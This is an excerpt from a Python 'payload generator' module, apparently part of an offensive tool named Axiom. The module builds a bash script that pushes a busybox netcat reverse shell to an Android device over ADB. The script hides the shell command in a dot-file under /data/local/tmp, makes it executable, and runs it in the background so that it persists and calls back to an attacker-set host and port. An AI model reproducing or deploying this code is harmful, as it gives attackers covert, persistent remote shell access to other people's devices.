"""
Axiom — Payload Generator Module
...
def generate_adb_payload_script(device_id: str = None, lhost: str = "10.0.0.1",
    ...
    script_lines = [
        "#!/bin/bash",
        f"# Axiom — ADB Persist & Shell Payload",
        f"# Author: Abdul Salam | Salamcs.app",
        ...
        f"$ADB shell 'echo \"busybox nc {lhost} {lport} -e /system/bin/sh\" > /data/local/tmp/.ax.sh'",
        "$ADB shell chmod 755 /data/local/tmp/.ax.sh",
        "$ADB shell nohup /data/local/tmp/.ax.sh &",
        "",
